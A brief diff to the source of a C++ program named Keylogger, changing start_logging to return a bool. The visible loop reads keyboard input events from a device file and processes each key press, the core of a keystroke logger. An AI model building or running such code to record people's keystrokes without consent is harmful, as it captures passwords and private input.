@@ -86,13 +86,14 @@ Keylogger::Keylogger(std::string log_filename) {
  *
  * Returns: None
  */
-void Keylogger::start_logging() {
+bool Keylogger::start_logging() {
     while (!m_done) {
         read(m_keyboard_fd, &m_ev, sizeof(struct input_event));
         if (m_ev.type == EV_KEY && m_ev.value == 1) {
             process_keys();
         }
     }
+    return true;
 }
 
 bool Keylogger::stop_logging() {
